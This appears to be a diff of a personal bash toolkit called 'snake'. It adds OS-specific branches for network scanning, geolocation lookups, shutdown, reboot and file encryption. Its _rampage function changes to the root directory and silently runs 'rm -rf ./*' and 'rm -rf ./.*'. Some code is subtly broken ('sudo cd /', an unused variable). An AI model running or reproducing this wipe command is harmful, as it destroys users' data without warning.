+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/water/g' | sed 's/S.N.A.K.E/W.A.T.E.R/g' > water
+    sudo rm -rf snake2 ; printf "retaw\n" ; sh water -qinstall ; sudo rm -rf water
+
+ else
+
+   printf "$RED WTH RANDOM OOR$NC\n"
+
+ fi
+
 
 
 }
 
 _radar(){
 
-    _system="$(uname -s)"
 
-    if [ $_system == "Darwin" ]; then
-       printf "\n"
-       printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2}')$NC\n"
-       printf "\n"
-    elif [[ $_system == "Linux" ]]; then
-       printf "\n"
-    else
-       printf "\n"
-    fi
-       speedtest-cli | grep -E 'Download|Upload'
-       echo " "
-       printf "$WHITE"
-       date
-       printf "$NC"
+
+       _system="$(uname -s)"
+
+       if [ $_system == "Darwin" ]; then
+
+         printf "\n"
+         printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2}')$NC\n"
+         printf "\n"
+
+         speedtest-cli | grep -E 'Download|Upload'
+         echo " "
+         printf "$WHITE"
+         date
+         printf "$NC"
+
+       elif [[ $_system == "Linux" ]]; then
+
+         speedtest-cli | grep -E 'Download|Upload'
+         echo " "
+         printf "$WHITE"
+         date
+         printf "$NC"
+
+       elif [[ $_system == "OpenBSD" ]]; then
+
+         speedtest-cli | grep -E 'Download|Upload'
+         echo " "
+         printf "$WHITE"
+         date
+         printf "$NC"
+
+       elif [[ $_system == "Minix" ]]; then
+
+         speedtest-cli | grep -E 'Download|Upload'
+         echo " "
+         printf "$WHITE"
+         date
+         printf "$NC"
+
+       elif [[ $_system == "Haiku" ]]; then
+
+         speedtest-cli | grep -E 'Download|Upload'
+         echo " "
+         printf "$WHITE"
+         date
+         printf "$NC"
+
+       else
+
+         printf "$RED Not on this system$NC\n"
+
+       fi
 
 }
 
@@ -2073,16 +3209,91 @@ _purge() {
 
 _rampage(){
 
-  clear
-  sudo cd /
-  bash -c 'rm -rf  ./*' >/dev/null 2>&1
-  bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
+
+  _system="$(uname -s)"
+
+  if [ $_system == "Darwin" ]; then
+
+    clear
+    sudo cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
+  elif [[ $_system == "Linux" ]]; then
+
+    clear
+    sudo cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
+  elif [[ $_system == "OpenBSD" ]]; then
+
+    clear
+    sudo cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
+  elif [[ $_system == "Minix" ]]; then
+
+    clear
+    cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
+  elif [[ $_system == "Haiku" ]]; then
+
+    clear
+    cd /
+    bash -c 'rm -rf  ./*' >/dev/null 2>&1
+    bash -c 'rm -rf ./.*' >/dev/null 2>&1
+
+  else
+
+    printf "$RED Not on this system$NC\n"
+
+  fi
 
 
 }
 
 
 _maid() {
+
+if [ $1 == "-e" ]; then
+
+    while true; do
+        read -ep 'Security Service, agent here, should I lock? [d/N] ' response
+        case $response in
+            [Ll]* )
+                tar -vcf directory.tar ./
+                openssl aes256 -in directory.tar -out locked_dir.aes256
+                break;;
+            * )
+                echo 'Locking canceled - Agent Signing Out'
+                break;;
+        esac
+    done
+    echo 'Locking done - Agent Signing Out'
+
+  elif [[ $1 == "-d" ]]; then
+
+    while true; do
+        read -ep 'Security Service, agent here, should I unlock? [d/N] ' response
+        case $response in
+            [Uu]* )
+                openssl aes256 -d -salt -in locked_dir.aes256 -out unlocked.tar
+                tar --one-top-level -xvf unlocked.tar
+                break;;
+            * )
+                echo 'Unlocking canceled - Agent Signing Out'
+                break;;
+        esac
+    done
+    echo 'Unlocking done - Agent Signing Out'
+
+  else
+
     while true; do
         read -ep 'Room Service, maid here, should I clean up? [d/N] ' response
         case $response in
@@ -2096,6 +3307,8 @@ _maid() {
         esac
     done
     echo 'Cleaning done - Maid Signing Out'
+
+  fi
 }
 
 _docked(){
@@ -2106,10 +3319,25 @@ _docked(){
 
 _ports(){
 
+  _system="$(uname -s)"
+
    for i in `seq $1 $2`;
         do
                 echo "Port $i ->>"
-                sudo lsof -i :$i
+
+                if [ $_system == "Darwin" ]; then
+                  sudo lsof -i :$i
+                elif [[ $_system == "Linux" ]]; then
+                  sudo lsof -i :$i
+                elif [[ $_system == "Haiku" ]]; then
+                  lsof -i :$i
+                elif [[ $_system == "Minix" ]]; then
+                  printf "$RED Not available on your OS$NC\n"
+                elif [[ $_system == "OpenBSD" ]]; then
+                  printf "$RED Not available on your OS$NC\n"
+                else
+                  printf "$RED Not available on your OS$NC\n"
+                fi
 
         done
 
@@ -2367,10 +3595,10 @@ _generalize(){
     clear
     _wts
     _motto
-    printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
-    printf "\n`echo Local IP  ` >> $YELLOW`ifconfig | awk '{print $3}'`$NC"
-    printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig enp0s3 | grep ether | awk '{print $2;}'`$NC"
-    printf "\n`echo Device  ` >> $YELLOW`_just_vendor $(ifconfig enp0s3 | grep ether | awk '{print $2;}')`$NC"
+    #printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
+    printf "\n`echo Local IP  ` >> $YELLOW`hostaddr -i`$NC"
+    printf "\n`echo MAC-Address  ` >> $YELLOW`hostaddr -e`$NC"
+    printf "\n`echo Device  ` >> $YELLOW`_just_vendor $(hostaddr -e)`$NC"
     printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
     printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
     printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
@@ -2379,7 +3607,7 @@ _generalize(){
     printf "$BLUE"
     arp -a | sed -n '1p'
     printf "$YELLOW"
-    arp -a | grep $(ifconfig enp0s3 | grep inet | awk '{print $2}')
+    arp -a | grep $(hostaddr -i)
     printf "$NC"
     arp -a | sed '1d'
     echo
@@ -2472,7 +3700,7 @@ _research(){
 
 _engage(){
 
-
+  clear
   printf "      $_name $RED Engage Mode $NC  \n"
   _wts
   _motto
@@ -2696,7 +3924,7 @@ _off(){
    sudo airport -z
  elif [[ $_system == "Linux" ]]; then
    sudo ip link set dev enp0s3 down
- elif [[ $_system == "BSD" ]]; then
+ elif [[ $_system == "OpenBSD" ]]; then
    printf "$RED Not supported on your OS$NC\n"
  elif [[ $_system == "Minix" ]]; then
    printf "$RED Not supported on your OS$NC\n"
@@ -2754,6 +3982,41 @@ _on(){
      printf "$RED Not available on your OS$NC\n"
    else
      printf "$RED Not available on your OS$NC\n"
+   fi
+
+}
+
+
+_metamorph(){
+
+
+   _system="$(uname -s)"
+
+
+   if [[ $1 == "image" ]]; then
+
+      if [ $3 == "iso" ]; then
+        sudo hdiutil makehybrid -iso -joliet -o $2.iso $4
+      else
+        printf "$RED Image type not supported$NC\n"
+      fi
+
+   elif [[ $1 == "archive" ]]; then
+
+     if [ $3 == "tar" ]; then
+       sudo tar -vcf $2.tar $4
+     else
+       printf "$RED Archive type not supported$NC\n"
+     fi
+
+   elif [[ $1 == "-e" ]]; then
+        openssl des -in $2 -out $2.sslz
+   elif [[ $1 == "-d" ]]; then
+
+        _newName="$2 | sed -e 's/.sslz//g'"
+        openssl des -d -in $2 -out $2.d
+   else
+        printf "$RED Metamorphing failed$NC\n"
    fi
 
 }
@@ -3028,20 +4291,105 @@ _inject(){
 
 _blood(){
 
+
+  _system="$(uname -s)"
+
+
+  if [ $_system == "Darwin" ]; then
+
   _red ; clear ; netstat -ap tcp ; quietTextRestore
+
+  elif [[ $_system == "Linux" ]]; then
+
+   _red ; clear ; netstat -ap tcp ; quietTextRestore
+
+ elif [[ $_system == "Haiku" ]]; then
+
+    _red ; clear ; netstat ; quietTextRestore
+
+  elif [[ $_system == "OpenBSD" ]]; then
+
+    _red ; clear ; netstat -ap tcp ; quietTextRestore
+
+  elif [[ $_system == "Minix" ]]; then
+
+    _red ; clear ; netstat -ap tcp ; quietTextRestore
+
+  else
+
+    printf "$RED Not available on this system$NC\n"
+
+  fi
 
 }
 
 _light(){
 
+
+
+_system="$(uname -s)"
+
+
+if [ $_system == "Darwin" ]; then
+
 _yellow ; clear ; netstat -ap udp ; quietTextRestore
+
+elif [[ $_system == "Linux" ]]; then
+
+ _yellow ; clear ; netstat -ap udp ; quietTextRestore
+
+elif [[ $_system == "Haiku" ]]; then
+
+  _yellow ; clear ; netstat ; quietTextRestore
+
+elif [[ $_system == "OpenBSD" ]]; then
+
+  _yellow ; clear ; netstat -ap udp ; quietTextRestore
+
+elif [[ $_system == "Minix" ]]; then
+
+  _yellow ; clear ; netstat -ap udp ; quietTextRestore
+
+else
+
+  printf "$RED Not available on this system$NC\n"
+
+fi
 
 }
 
 _poof(){
 
 
+  _system="$(uname -s)"
+
+  if [ $_system == "Darwin" ]; then
+
     killall Terminal
+
+  elif [[ $_system == "Linux" ]]; then
+
+    killall gnome-terminal
+
+  elif [[ $_system == "OpenBSD" ]]; then
+
+    killall terminal
+
+  elif [[ $_system == "Minix" ]]; then
+
+    killall terminal
+
+  elif [[ $_system == "Haiku" ]]; then
+
+    killall Terminal
+
+  else
+
+    printf "$RED Not on this system$NC\n"
+
+  fi
+
+
 
 }
 
@@ -3063,8 +4411,8 @@ if [ $_system == "Darwin" ]; then
 elif [[ $_system == "Linux" ]]; then
    ifconfig enp0s3 | grep ether | awk '{print $2}'
 elif [[ $_system == "Haiku" ]]; then
-   ifconfig | grep ether | awk '{print $2}'
-elif [[ $_system == "BSD" ]]; then
+   ifconfig | grep Address | sed '1d' | awk '{print $5}'
+elif [[ $_system == "OpenBSD" ]]; then
    ifconfig | grep ether | awk '{print $2}'
 elif [[ $_system == "Minix" ]]; then
    ifconfig | grep ether | awk '{print $2}'
@@ -3086,10 +4434,10 @@ _suicide(){
      sudo shutdown now
   elif [[ $_system == "Linux" ]]; then
      sudo shutdown now
-   elif [[ $_system == "BSD" ]]; then
-     sudo shutdown now
+   elif [[ $_system == "OpenBSD" ]]; then
+     su ; shutdown now
    elif [[ $_system == "Minix" ]]; then
-     sudo shutdown now
+     shutdown now
    elif [[ $_system == "Haiku" ]]; then
      shutdown
    elif [[ $_system == "$(uname -n)" ]]; then # UNIX
@@ -3102,7 +4450,25 @@ _suicide(){
 
 _reboot(){
 
-sudo reboot now
+
+
+
+_system="$(uname -s)"
+
+
+if [ $_system == "Darwin" ]; then
+   sudo reboot now
+elif [[ $_system == "Linux" ]]; then
+   sudo reboot now
+ elif [[ $_system == "OpenBSD" ]]; then
+   reboot
+ elif [[ $_system == "Minix" ]]; then
+   reboot now
+ elif [[ $_system == "Haiku" ]]; then
+   reboot
+ elif [[ $_system == "$(uname -n)" ]]; then # UNIX
+   reboot
+ fi
 
 }
 
@@ -3134,32 +4500,103 @@ _scanHouse(){
      printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2,$3,$4,$5,$6}')$NC\n"
      printf "\n"
 
-  fi
+     arp -a
+     printf "$WHITE\n"
+     date
+     printf "$NC\n"
+
+   elif [[ "$_system" == "Linux" ]]; then
 
      arp -a
      printf "$WHITE\n"
      date
      printf "$NC\n"
 
+   elif [[ "$_system" == "Haiku" ]]; then
+
+     arp -a
+     printf "$WHITE\n"
+     date
+     printf "$NC\n"
+
+   elif [[ "$_system" == "OpenBSD" ]]; then
+
+     arp -a
+     printf "$WHITE\n"
+     date
+     printf "$NC\n"
+
+   elif [[ "$_system" == "Minix" ]]; then
+
+     arp -a
+     printf "$WHITE\n"
+     date
+     printf "$NC\n"
+
+   else
+
+     printf "$RED Not on this system$NC\n"
+
+  fi
+
+
+
 
 }
 
 _deepHouse(){
 
-  _system="$(uname -s)"
 
-   if [ "$_system" == "Darwin" ]; then
 
-      printf "\n"
-      printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2,$3,$4,$5,$6}')$NC\n"
-      printf "\n"
 
-   fi
 
-      sudo arp-scan -l | sed -n '2!p'
-      printf "$WHITE\n"
-      date
-      printf "$NC\n"
+
+      _system="$(uname -s)"
+
+      if [ "$_system" == "Darwin" ]; then
+
+         printf "\n"
+         printf "$WHITE$(airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2,$3,$4,$5,$6}')$NC\n"
+         printf "\n"
+
+         sudo arp-scan -l | sed -n '2!p'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ "$_system" == "Linux" ]]; then
+
+         sudo arp-scan -l | sed -n '2!p'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ "$_system" == "Haiku" ]]; then
+
+         arp -a | awk '{print $1,$3,$2}'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ "$_system" == "OpenBSD" ]]; then
+
+         sudo arp-scan -l | sed -n '2!p'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       elif [[ "$_system" == "Minix" ]]; then
+
+         arp-scan -l | sed -n '2!p'
+         printf "$WHITE\n"
+         date
+         printf "$NC\n"
+
+       else
+
+         printf "$RED Not on this system$NC\n"
+
+      fi
 
 }
 
@@ -3506,7 +4943,7 @@ printf "         --morph - Network morphing\n"
 printf "         --brew - Just like magic\n"
 printf "\n"
 printf "Examples: snake -p\n"
-printf "          snake -o --summon Artyom\n"
+printf "          snake --summon Artyom\n"
 printf "          snake --opaa\n"
 printf "\n"
 
@@ -3551,6 +4988,22 @@ elif [[ "$1" == "--look" ]]; then
 
     _look
 
+elif [[ "$1" == "--qinstall" ]]; then
+
+    _exec_q
+
+elif [[ "$1" == "-qinstall" ]]; then
+
+      _exec_q
+
+elif [[ "$1" == "-uninstall" ]]; then
+
+     _exec_u
+
+elif [[ "$1" == "--uninstall" ]]; then
+
+     _exec_u
+
 elif [[ "$1" == "--install" ]]; then
 
      _exec_i
@@ -3570,6 +5023,14 @@ elif [[ "$1" == "--morph" ]]; then
 elif [[ "$1" == "-morph" ]]; then
 
      _morph $2 $3
+
+elif [[ "$1" == "-meta" ]]; then
+
+     _metamorph $2 $3 $4 $5
+
+elif [[ "$1" == "--meta" ]]; then
+
+     _metamorph $2 $3 $4 $5
 
 elif [[ "$1" == "--opaa" ]]; then
 
@@ -3614,7 +5075,7 @@ elif [[ "$1" == "-purge" ]]; then
 
 elif [[ "$1" == "-maid" ]]; then
 
-     _maid
+     _maid $2
 
 elif [[ "$1" == "-cheese" ]]; then
 
@@ -3752,6 +5213,14 @@ elif [[ "$1" == "-appID" ]]; then
 
   _appID
 
+elif [[ "$1" == "-melt" ]]; then
+
+  _melt
+
+elif [[ "$1" == "--melt" ]]; then
+
+  _melt
+
 elif [[ "$1" == "-net" ]]; then
 
   _network $2
@@ -3772,7 +5241,15 @@ elif [[ "$1" == "iseerouter" ]]; then
 
   _router_info
 
+elif [[ "$1" == "router" ]]; then
+
+  _router_info
+
 elif [[ "$1" == "iseepeople" ]]; then
+
+  _people
+
+elif [[ "$1" == "people" ]]; then
 
   _people
 
@@ -3780,11 +5257,23 @@ elif [[ "$1" == "iseedevices" ]]; then
 
   _people
 
+elif [[ "$1" == "devices" ]]; then
+
+  _people
+
 elif [[ "$1" == "iseeeverything" ]]; then
 
   _everything
 
+elif [[ "$1" == "everything" ]]; then
+
+  _everything
+
 elif [[ "$1" == "iseemyself" ]]; then
+
+  _myself
+
+elif [[ "$1" == "myself" ]]; then
 
   _myself
 
@@ -3797,9 +5286,11 @@ elif [[ "$1" == "-badblood" ]]; then
   _badblood
 
 elif [[ "$1" == "-mac" ]]; then
+
   _macA
 
 elif [[ "$1" == "-cloak" ]]; then
+
   _cloak $2 $3 $4
 
 elif [[ "$1" == "-scan" ]]; then
@@ -3807,6 +5298,7 @@ elif [[ "$1" == "-scan" ]]; then
   _scanHouse
 
 elif [[ "$1" == "-test" ]]; then
+
   _newScan
 
 
